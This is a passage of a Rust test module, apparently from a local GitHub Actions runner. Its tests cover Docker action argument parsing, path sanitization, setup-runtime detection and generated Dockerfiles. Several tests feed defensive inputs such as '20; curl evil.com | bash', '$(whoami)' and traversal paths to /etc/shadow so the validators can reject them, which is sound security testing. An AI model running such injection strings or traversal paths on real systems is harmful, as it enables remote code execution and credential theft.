  args: "hello 'world"
"#,
        )
        .unwrap();
        let result = extract_docker_runs_config(Some(&yaml));
        assert!(result.is_err(), "unmatched quote should return Err");
        assert!(result.unwrap_err().contains("unmatched quote"));
    }

    // --- Dockerfile path sanitization tests ---

    #[test]
    fn dockerfile_rel_strips_docker_prefix() {
        assert_eq!(
            sanitize_dockerfile_rel("docker://Dockerfile").unwrap(),
            "Dockerfile"
        );
    }

    #[test]
    fn dockerfile_rel_strips_leading_slash() {
        assert_eq!(
            sanitize_dockerfile_rel("docker:///etc/Dockerfile").unwrap(),
            "etc/Dockerfile"
        );
    }

    #[test]
    fn dockerfile_rel_rejects_dotdot_traversal() {
        assert!(sanitize_dockerfile_rel("docker://../../etc/passwd").is_err());
    }

    #[test]
    fn dockerfile_rel_rejects_dotdot_in_middle() {
        assert!(sanitize_dockerfile_rel("subdir/../../../etc/shadow").is_err());
    }

    #[test]
    fn dockerfile_rel_rejects_backslash_traversal() {
        assert!(sanitize_dockerfile_rel("..\\..\\etc\\shadow").is_err());
    }

    #[test]
    fn dockerfile_rel_rejects_mixed_separator_traversal() {
        assert!(sanitize_dockerfile_rel("subdir\\..\\..\\etc/shadow").is_err());
    }

    #[test]
    fn dockerfile_rel_plain_dockerfile() {
        assert_eq!(sanitize_dockerfile_rel("Dockerfile").unwrap(), "Dockerfile");
    }

    #[test]
    fn dockerfile_rel_relative_path() {
        assert_eq!(
            sanitize_dockerfile_rel("./build/Dockerfile").unwrap(),
            "build/Dockerfile"
        );
    }

    #[test]
    fn dockerfile_rel_allows_dotdot_in_filename() {
        // ".." as a substring in a filename is not path traversal
        assert_eq!(
            sanitize_dockerfile_rel("foo..bar/Dockerfile").unwrap(),
            "foo..bar/Dockerfile"
        );
    }

    #[test]
    fn dockerfile_rel_rejects_empty_string() {
        assert!(sanitize_dockerfile_rel("").is_err());
    }

    #[test]
    fn dockerfile_rel_rejects_docker_prefix_only() {
        assert!(sanitize_dockerfile_rel("docker://").is_err());
    }

    // --- sub_path sanitization tests ---

    #[test]
    fn sub_path_allows_simple_path() {
        assert!(sanitize_sub_path("subdir").is_ok());
    }

    #[test]
    fn sub_path_allows_nested_path() {
        assert!(sanitize_sub_path("a/b/c").is_ok());
    }

    #[test]
    fn sub_path_rejects_dotdot() {
        assert!(sanitize_sub_path("..").is_err());
    }

    #[test]
    fn sub_path_rejects_dotdot_prefix() {
        assert!(sanitize_sub_path("../../etc").is_err());
    }

    #[test]
    fn sub_path_rejects_dotdot_in_middle() {
        assert!(sanitize_sub_path("a/../../../etc").is_err());
    }

    #[test]
    fn sub_path_allows_dotdot_in_name() {
        // ".." as a substring in a directory name is not traversal
        assert!(sanitize_sub_path("foo..bar").is_ok());
    }

    // --- null byte rejection tests ---

    #[test]
    fn sub_path_rejects_null_byte() {
        assert!(sanitize_sub_path("foo\0bar").is_err());
    }

    #[test]
    fn dockerfile_rel_rejects_null_byte() {
        assert!(sanitize_dockerfile_rel("Dockerfile\0.txt").is_err());
    }

    // --- extract_docker_runs_config with numeric/bool args ---

    #[test]
    fn extract_runs_config_args_coerces_non_string_values() {
        let yaml: serde_yaml::Value = serde_yaml::from_str(
            r#"
runs:
  using: docker
  image: Dockerfile
  args:
    - 42
    - true
    - --flag
"#,
        )
        .unwrap();
        let (_, args) = extract_docker_runs_config(Some(&yaml)).unwrap();
        assert_eq!(args.len(), 3);
        assert_eq!(args[0], "42");
        assert_eq!(args[1], "true");
        assert_eq!(args[2], "--flag");
    }

    // --- Mock ContainerRuntime for NativeDocker integration tests ---

    use std::sync::{Arc, Mutex};
    use wrkflw_runtime::container::{ContainerError, ContainerOutput};

    /// Records all `run_container` calls for later assertion.
    #[derive(Clone, Default)]
    struct MockContainerRuntime {
        run_calls: Arc<Mutex<Vec<RunContainerCall>>>,
    }

    #[derive(Debug, Clone)]
    struct RunContainerCall {
        image: String,
        cmd: Vec<String>,
        env_vars: Vec<(String, String)>,
        entrypoint: Option<String>,
    }

    #[async_trait::async_trait]
    impl ContainerRuntime for MockContainerRuntime {
        async fn run_container(
            &self,
            image: &str,
            cmd: &[&str],
            env_vars: &[(&str, &str)],
            _working_dir: &Path,
            _volumes: &[(&Path, &Path)],
            entrypoint: Option<&str>,
        ) -> Result<ContainerOutput, ContainerError> {
            self.run_calls.lock().unwrap().push(RunContainerCall {
                image: image.to_string(),
                cmd: cmd.iter().map(|s| s.to_string()).collect(),
                env_vars: env_vars
                    .iter()
                    .map(|(k, v)| (k.to_string(), v.to_string()))
                    .collect(),
                entrypoint: entrypoint.map(|s| s.to_string()),
            });
            Ok(ContainerOutput {
                stdout: "mock ok".to_string(),
                stderr: String::new(),
                exit_code: 0,
            })
        }

        async fn pull_image(&self, _image: &str) -> Result<(), ContainerError> {
            Ok(())
        }

        async fn build_image(
            &self,
            _dockerfile: &Path,
            _tag: &str,
            _context_dir: &Path,
        ) -> Result<(), ContainerError> {
            Ok(())
        }

        async fn prepare_language_environment(
            &self,
            _language: &str,
            _version: Option<&str>,
            _additional_packages: Option<Vec<String>>,
        ) -> Result<String, ContainerError> {
            Ok("mock-image:latest".to_string())
        }

        async fn image_exists(&self, _tag: &str) -> Result<bool, ContainerError> {
            Ok(false)
        }
    }

    /// Helper to build a minimal `WorkflowDefinition`.
    fn minimal_workflow() -> WorkflowDefinition {
        WorkflowDefinition {
            name: "test".to_string(),
            on: vec![],
            on_raw: serde_yaml::Value::Null,
            jobs: Default::default(),
            defaults: None,
        }
    }

    /// Helper to build a `Step` with sensible defaults (Step doesn't derive Default).
    fn make_step(
        name: &str,
        uses: &str,
        with: Option<HashMap<String, String>>,
        env: HashMap<String, String>,
    ) -> Step {
        Step {
            name: Some(name.to_string()),
            uses: Some(uses.to_string()),
            run: None,
            with,
            env,
            continue_on_error: None,
            if_condition: None,
            id: None,
            working_directory: None,
            shell: None,
            timeout_minutes: None,
        }
    }

    // --- NativeDocker execute_step integration tests ---

    #[tokio::test]
    async fn native_docker_passes_entrypoint_and_args() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        // Step uses a docker:// image — triggers NativeDocker path via prepare_action
        let step = make_step("docker-step", "docker://alpine:3.18", None, HashMap::new());

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            secret_manager: None,
            secret_masker: None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        assert_eq!(calls.len(), 1);
        let call = &calls[0];
        assert_eq!(call.image, "alpine:3.18");
        // docker:// actions have no runs.entrypoint — uses image default
        assert!(call.entrypoint.is_none());
        // No args either — uses image CMD
        assert!(call.cmd.is_empty());
    }

    #[tokio::test]
    async fn native_docker_with_args_override() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let mut with = HashMap::new();
        with.insert("args".to_string(), "hello world".to_string());
        with.insert("myinput".to_string(), "myvalue".to_string());

        let step = make_step(
            "docker-args-step",
            "docker://alpine:3.18",
            Some(with),
            HashMap::new(),
        );

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            secret_manager: None,
            secret_masker: None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        assert_eq!(calls.len(), 1);
        let call = &calls[0];
        // with.args should be shell-tokenized into the CMD
        assert_eq!(call.cmd, vec!["hello", "world"]);
        // INPUT_* env vars should be set
        let env_map: HashMap<&str, &str> = call
            .env_vars
            .iter()
            .map(|(k, v)| (k.as_str(), v.as_str()))
            .collect();
        assert_eq!(env_map.get("INPUT_ARGS"), Some(&"hello world"));
        assert_eq!(env_map.get("INPUT_MYINPUT"), Some(&"myvalue"));
    }

    #[tokio::test]
    async fn native_docker_empty_with_args_passes_zero_args() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let mut with = HashMap::new();
        // Empty string means "pass zero args" — overrides any runs.args
        with.insert("args".to_string(), String::new());

        let step = make_step(
            "docker-empty-args",
            "docker://alpine:3.18",
            Some(with),
            HashMap::new(),
        );

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            secret_manager: None,
            secret_masker: None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        assert_eq!(calls.len(), 1);
        assert!(
            calls[0].cmd.is_empty(),
            "empty with.args should yield zero CMD args"
        );
    }

    #[tokio::test]
    async fn native_docker_step_env_injected() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let mut job_env = HashMap::new();
        job_env.insert("JOB_VAR".to_string(), "from-job".to_string());
        let working_dir = std::env::current_dir().unwrap();

        let mut step_env_map = HashMap::new();
        step_env_map.insert("STEP_VAR".to_string(), "from-step".to_string());

        let step = make_step(
            "docker-env-step",
            "docker://alpine:3.18",
            None,
            step_env_map,
        );

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            secret_manager: None,
            secret_masker: None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        let env_map: HashMap<&str, &str> = calls[0]
            .env_vars
            .iter()
            .map(|(k, v)| (k.as_str(), v.as_str()))
            .collect();
        assert_eq!(env_map.get("JOB_VAR"), Some(&"from-job"));
        assert_eq!(env_map.get("STEP_VAR"), Some(&"from-step"));
    }

    #[tokio::test]
    async fn native_docker_with_args_unmatched_quote_is_error() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let mut with = HashMap::new();
        with.insert("args".to_string(), "hello 'world".to_string());

        let step = make_step(
            "docker-bad-args",
            "docker://alpine:3.18",
            Some(with),
            HashMap::new(),
        );

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            secret_manager: None,
            secret_masker: None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
        };

        let result = execute_step(ctx).await;
        assert!(result.is_err(), "unmatched quote in with.args should error");
        let err = result.unwrap_err().to_string();
        assert!(
            err.contains("unmatched quote"),
            "error should mention unmatched quote, got: {}",
            err
        );
    }

    #[tokio::test]
    async fn native_docker_runs_args_overridden_by_with_args() {
        // When both runs.args (from action.yml) and with.args (from workflow)
        // are present, with.args should win — matching GitHub Actions behavior.
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let mut with = HashMap::new();
        with.insert("args".to_string(), "override-arg".to_string());

        let step = make_step(
            "docker-override-step",
            "docker://alpine:3.18",
            Some(with),
            HashMap::new(),
        );

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            secret_manager: None,
            secret_masker: None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        assert_eq!(calls.len(), 1);
        // with.args takes precedence over any runs.args the action may have
        assert_eq!(calls[0].cmd, vec!["override-arg"]);
    }

    #[tokio::test]
    async fn native_docker_with_entrypoint_override() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let mut with = HashMap::new();
        with.insert("entrypoint".to_string(), "/custom.sh".to_string());
        with.insert("args".to_string(), "hello".to_string());

        let step = make_step(
            "docker-ep-override",
            "docker://alpine:3.18",
            Some(with),
            HashMap::new(),
        );

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            secret_manager: None,
            secret_masker: None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        assert_eq!(calls.len(), 1);
        let call = &calls[0];
        // with.entrypoint should override the image default
        assert_eq!(call.entrypoint.as_deref(), Some("/custom.sh"));
        assert_eq!(call.cmd, vec!["hello"]);
    }

    #[test]
    fn extract_runs_config_empty_entrypoint_treated_as_none() {
        let yaml: serde_yaml::Value = serde_yaml::from_str(
            r#"
runs:
  using: docker
  image: Dockerfile
  entrypoint: ""
"#,
        )
        .unwrap();
        let (ep, _) = extract_docker_runs_config(Some(&yaml)).unwrap();
        assert!(
            ep.is_none(),
            "empty entrypoint string should be treated as None"
        );
    }

    // --- sub_path backslash traversal tests ---

    #[test]
    fn sub_path_rejects_backslash_dotdot() {
        assert!(sanitize_sub_path("a\\..\\..\\etc").is_err());
    }

    #[test]
    fn sub_path_rejects_mixed_separator_dotdot() {
        assert!(sanitize_sub_path("a/..\\..\\etc").is_err());
    }

    // --- detect_setup_runtimes tests ---

    fn make_step_uses(uses: &str, with: Option<HashMap<String, String>>) -> Step {
        Step {
            name: None,
            uses: Some(uses.to_string()),
            run: None,
            with,
            env: HashMap::new(),
            continue_on_error: None,
            if_condition: None,
            id: None,
            working_directory: None,
            shell: None,
            timeout_minutes: None,
        }
    }

    fn make_step_run(run: &str) -> Step {
        Step {
            name: None,
            uses: None,
            run: Some(run.to_string()),
            with: None,
            env: HashMap::new(),
            continue_on_error: None,
            if_condition: None,
            id: None,
            working_directory: None,
            shell: None,
            timeout_minutes: None,
        }
    }

    #[test]
    fn detect_setup_runtimes_empty_steps() {
        let runtimes = detect_setup_runtimes(&[]);
        assert!(runtimes.is_empty());
    }

    #[test]
    fn detect_setup_runtimes_no_setup_actions() {
        let steps = vec![
            make_step_uses("actions/checkout@v4", None),
            make_step_uses("actions/cache@v3", None),
            make_step_run("echo hello"),
        ];
        let runtimes = detect_setup_runtimes(&steps);
        assert!(runtimes.is_empty());
    }

    #[test]
    fn detect_setup_runtimes_single_node() {
        let steps = vec![
            make_step_uses("actions/checkout@v4", None),
            make_step_uses("actions/setup-node@v3", None),
            make_step_run("npm install"),
        ];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].language, "node");
        assert_eq!(runtimes[0].version, "20");
        assert!(!runtimes[0].install_script.is_empty());
    }

    #[test]
    fn detect_setup_runtimes_node_with_version() {
        let with = HashMap::from([("node-version".to_string(), "16.x".to_string())]);
        let steps = vec![make_step_uses("actions/setup-node@v3", Some(with))];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].language, "node");
        // ".x" suffix is normalized away
        assert_eq!(runtimes[0].version, "16");
    }

    #[test]
    fn detect_setup_runtimes_php() {
        let with = HashMap::from([("php".to_string(), "8.1".to_string())]);
        let steps = vec![make_step_uses("shivammathur/setup-php@v2", Some(with))];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].language, "php");
        assert_eq!(runtimes[0].version, "8.1");
    }

    #[test]
    fn detect_setup_runtimes_multi_language() {
        let steps = vec![
            make_step_uses("actions/checkout@v4", None),
            make_step_uses("shivammathur/setup-php@v2", None),
            make_step_uses("actions/setup-node@v4", None),
            make_step_run("composer install"),
            make_step_run("npm install"),
        ];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 2);
        assert_eq!(runtimes[0].language, "php");
        assert_eq!(runtimes[1].language, "node");
    }

    #[test]
    fn detect_setup_runtimes_python_with_version() {
        let with = HashMap::from([("python-version".to_string(), "3.12".to_string())]);
        let steps = vec![make_step_uses("actions/setup-python@v5", Some(with))];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].language, "python");
        assert_eq!(runtimes[0].version, "3.12");
    }

    #[test]
    fn detect_setup_runtimes_go() {
        let with = HashMap::from([("go-version".to_string(), "1.22".to_string())]);
        let steps = vec![make_step_uses("actions/setup-go@v5", Some(with))];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].language, "go");
        assert_eq!(runtimes[0].version, "1.22");
    }

    #[test]
    fn detect_setup_runtimes_rust() {
        let steps = vec![make_step_uses("dtolnay/rust-toolchain@stable", None)];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].language, "rust");
        assert_eq!(runtimes[0].version, "stable");
    }

    #[test]
    fn detect_setup_runtimes_rust_version_from_ref() {
        // dtolnay/rust-toolchain encodes the toolchain in the @ref
        let steps = vec![make_step_uses("dtolnay/rust-toolchain@nightly", None)];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].language, "rust");
        assert_eq!(runtimes[0].version, "nightly");
    }

    #[test]
    fn detect_setup_runtimes_rust_with_overrides_ref() {
        // Explicit with.toolchain takes precedence over @ref
        let with = HashMap::from([("toolchain".to_string(), "beta".to_string())]);
        let steps = vec![make_step_uses("dtolnay/rust-toolchain@nightly", Some(with))];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].version, "beta");
    }

    #[test]
    fn detect_setup_runtimes_rust_sha_ref_falls_back_to_default() {
        // A pinned SHA ref should NOT be treated as a toolchain version
        let steps = vec![make_step_uses(
            "dtolnay/rust-toolchain@d4ff7a3c5bbbc35c47ee72003c3e0a88e24a9919",
            None,
        )];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].language, "rust");
        assert_eq!(runtimes[0].version, "stable");
    }

    #[test]
    fn detect_setup_runtimes_normalizes_dot_x_suffix() {
        // "16.x" should be normalized to "16"
        let with = HashMap::from([("node-version".to_string(), "16.x".to_string())]);
        let steps = vec![make_step_uses("actions/setup-node@v3", Some(with))];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].version, "16");
    }

    #[test]
    fn detect_setup_runtimes_java() {
        let with = HashMap::from([("java-version".to_string(), "21".to_string())]);
        let steps = vec![make_step_uses("actions/setup-java@v4", Some(with))];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].language, "java");
        assert_eq!(runtimes[0].version, "21");
    }

    #[test]
    fn detect_setup_runtimes_dotnet() {
        let with = HashMap::from([("dotnet-version".to_string(), "8.0".to_string())]);
        let steps = vec![make_step_uses("actions/setup-dotnet@v4", Some(with))];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].language, "dotnet");
        assert_eq!(runtimes[0].version, "8.0");
    }

    #[test]
    fn get_install_script_returns_nonempty_for_known_languages() {
        for lang in &["node", "php", "python", "go", "java", "dotnet", "rust"] {
            let script = get_install_script(lang, "latest");
            assert!(
                !script.is_empty(),
                "install script for {} should not be empty",
                lang
            );
        }
    }

    #[test]
    fn get_install_script_returns_empty_for_unknown() {
        assert!(get_install_script("unknown_lang", "1.0").is_empty());
    }

    // --- version sanitization tests ---

    #[test]
    fn is_safe_version_accepts_valid() {
        assert!(is_safe_version("20"));
        assert!(is_safe_version("3.12"));
        assert!(is_safe_version("16.x"));
        assert!(is_safe_version("8.2-rc1"));
        assert!(is_safe_version("stable"));
        assert!(is_safe_version("1.21_beta"));
    }

    #[test]
    fn is_safe_version_rejects_injection() {
        assert!(!is_safe_version(""));
        assert!(!is_safe_version("20; curl evil.com | bash"));
        assert!(!is_safe_version("20\nRUN malicious"));
        assert!(!is_safe_version("20 && echo pwned"));
        assert!(!is_safe_version("$(whoami)"));
        assert!(!is_safe_version("20`id`"));
    }

    #[test]
    fn detect_setup_runtimes_skips_invalid_version() {
        let with = HashMap::from([(
            "node-version".to_string(),
            "20; curl evil.com | bash".to_string(),
        )]);
        let steps = vec![make_step_uses("actions/setup-node@v3", Some(with))];
        let runtimes = detect_setup_runtimes(&steps);
        assert!(runtimes.is_empty());
    }

    // --- deduplication tests ---

    #[test]
    fn detect_setup_runtimes_deduplicates_same_language() {
        let with_16 = HashMap::from([("node-version".to_string(), "16".to_string())]);
        let with_20 = HashMap::from([("node-version".to_string(), "20".to_string())]);
        let steps = vec![
            make_step_uses("actions/setup-node@v3", Some(with_16)),
            make_step_uses("actions/setup-node@v4", Some(with_20)),
        ];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        // Last one wins
        assert_eq!(runtimes[0].version, "20");
    }

    // --- exact match tests ---

    #[test]
    fn detect_setup_runtimes_ignores_similar_action_names() {
        let steps = vec![
            make_step_uses("actions/setup-node-legacy@v1", None),
            make_step_uses("actions/setup-nodejs@v1", None),
        ];
        let runtimes = detect_setup_runtimes(&steps);
        assert!(runtimes.is_empty());
    }

    // --- determine_action_image exact-match tests ---

    #[test]
    fn determine_action_image_exact_match_setup_actions() {
        // Known setup actions should return the runner base
        assert_eq!(
            determine_action_image("actions/setup-node"),
            "catthehacker/ubuntu:act-latest"
        );
        assert_eq!(
            determine_action_image("actions/setup-python"),
            "catthehacker/ubuntu:act-latest"
        );
        assert_eq!(
            determine_action_image("shivammathur/setup-php"),
            "catthehacker/ubuntu:act-latest"
        );
        assert_eq!(
            determine_action_image("dtolnay/rust-toolchain"),
            "catthehacker/ubuntu:act-latest"
        );
    }

    #[test]
    fn determine_action_image_rejects_similar_names() {
        // Similar-but-different action names must NOT match setup actions
        assert_eq!(
            determine_action_image("actions/setup-node-legacy"),
            "node:20-slim"
        );
        assert_eq!(
            determine_action_image("actions/setup-nodejs"),
            "node:20-slim"
        );
    }

    #[test]
    fn determine_action_image_core_actions() {
        assert_eq!(
            determine_action_image("actions/checkout"),
            "catthehacker/ubuntu:act-latest"
        );
        assert_eq!(
            determine_action_image("actions/cache"),
            "catthehacker/ubuntu:act-latest"
        );
    }

    #[test]
    fn determine_action_image_namespace_prefix() {
        // docker/* and aws-actions/* use namespace prefix matching
        assert_eq!(
            determine_action_image("docker/build-push-action"),
            "docker:latest"
        );
        assert_eq!(
            determine_action_image("docker/login-action"),
            "docker:latest"
        );
        assert_eq!(
            determine_action_image("aws-actions/configure-aws-credentials"),
            "amazon/aws-cli:latest"
        );
    }

    // --- Dockerfile generation tests ---

    #[test]
    fn generate_combined_dockerfile_single_runtime() {
        let runtimes = vec![SetupRuntime {
            language: "node".to_string(),
            version: "20".to_string(),
            install_script: get_install_script("node", "20"),
        }];
        let df = generate_combined_dockerfile(&runtimes, "ubuntu:latest");
        assert!(df.starts_with("FROM ubuntu:latest\n"));
        assert!(df.contains("nodesource"));
        // Everything in a single RUN layer
        assert_eq!(df.matches("RUN ").count(), 1);
    }

    #[test]
    fn generate_combined_dockerfile_multi_runtime_single_run() {
        let runtimes = vec![
            SetupRuntime {
                language: "node".to_string(),
                version: "20".to_string(),
                install_script: get_install_script("node", "20"),
            },
            SetupRuntime {
                language: "python".to_string(),
                version: "3.12".to_string(),
                install_script: get_install_script("python", "3.12"),
            },
        ];
        let df = generate_combined_dockerfile(&runtimes, "ubuntu:latest");
        // Everything in a single RUN layer
        assert_eq!(df.matches("RUN ").count(), 1);
        assert!(df.contains("nodesource"));
        assert!(df.contains("deadsnakes"));
    }

    #[test]
    fn generate_combined_dockerfile_skips_empty_scripts() {
        let runtimes = vec![SetupRuntime {
            language: "unknown".to_string(),
            version: "1.0".to_string(),
            install_script: String::new(),
        }];
        let df = generate_combined_dockerfile(&runtimes, "ubuntu:latest");
        // Single RUN layer with just the base packages
        assert_eq!(df.matches("RUN ").count(), 1);
    }

    #[test]
    fn combined_image_tag_is_deterministic() {
        let runtimes = vec![
            SetupRuntime {
                language: "node".to_string(),
                version: "20".to_string(),
                install_script: "install node".to_string(),
            },
            SetupRuntime {
                language: "python".to_string(),
                version: "3.12".to_string(),
                install_script: "install python".to_string(),
            },
        ];
        let df = "FROM base\nRUN install stuff\n";
        let tag1 = combined_image_tag(&runtimes, df);
        let tag2 = combined_image_tag(&runtimes, df);
        assert_eq!(tag1, tag2);
        assert!(tag1.starts_with(COMBINED_IMAGE_PREFIX));
    }

    #[test]
    fn combined_image_tag_changes_when_dockerfile_changes() {
        let runtimes = vec![SetupRuntime {
            language: "node".to_string(),
            version: "20".to_string(),
            install_script: "install node v1".to_string(),
        }];
        let tag1 = combined_image_tag(&runtimes, "FROM base\nRUN v1\n");
        let tag2 = combined_image_tag(&runtimes, "FROM base\nRUN v2\n");
        assert_ne!(tag1, tag2);
    }

    #[test]
    fn combined_image_tag_sorts_languages() {
        let runtimes_ab = vec![
            SetupRuntime {
                language: "a".to_string(),
                version: "1".to_string(),
                install_script: String::new(),
            },
            SetupRuntime {
                language: "b".to_string(),
                version: "2".to_string(),
                install_script: String::new(),
            },
        ];
        let runtimes_ba = vec![
            SetupRuntime {
                language: "b".to_string(),
                version: "2".to_string(),
                install_script: String::new(),
            },
            SetupRuntime {
                language: "a".to_string(),
                version: "1".to_string(),
                install_script: String::new(),
            },
        ];
        let df = "same";
        let tag_ab = combined_image_tag(&runtimes_ab, df);
        let tag_ba = combined_image_tag(&runtimes_ba, df);
        // Both should produce the same sorted prefix (a1-b2)
        assert_eq!(tag_ab, tag_ba);
    }

    // --- Shell invocation tests ---

    fn make_run_step(run: &str) -> Step {
        Step {
            name: Some("run-step".to_string()),
            uses: None,
            run: Some(run.to_string()),
            with: None,
            env: HashMap::new(),
            continue_on_error: None,
            if_condition: None,
            id: None,
            working_directory: None,
            shell: None,
            timeout_minutes: None,
        }
    }

    #[tokio::test]
    async fn bash_shell_uses_errexit_and_pipefail() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let step = make_run_step("echo hello");

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            secret_manager: None,
            secret_masker: None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        assert_eq!(calls.len(), 1);
        let cmd = &calls[0].cmd;
        // Should be: bash --noprofile --norc -e -o pipefail -c <script>
        assert_eq!(cmd[0], "bash");
        assert_eq!(cmd[1], "--noprofile");
        assert_eq!(cmd[2], "--norc");
        assert_eq!(cmd[3], "-e");
        assert_eq!(cmd[4], "-o");
        assert_eq!(cmd[5], "pipefail");
        assert_eq!(cmd[6], "-c");
        assert_eq!(cmd[7], "echo hello");
    }

    #[tokio::test]
    async fn sh_shell_uses_errexit() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let mut step = make_run_step("echo hello");
        step.shell = Some("sh".to_string());

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            secret_manager: None,
            secret_masker: None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        let cmd = &calls[0].cmd;
        assert_eq!(cmd[0], "sh");
        assert_eq!(cmd[1], "-e");
        assert_eq!(cmd[2], "-c");
        assert_eq!(cmd[3], "echo hello");
    }

    // --- Working-directory path traversal tests ---

    #[tokio::test]
    async fn working_directory_rejects_parent_traversal() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let mut step = make_run_step("echo pwned");
        step.working_directory = Some("../../etc".to_string());

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
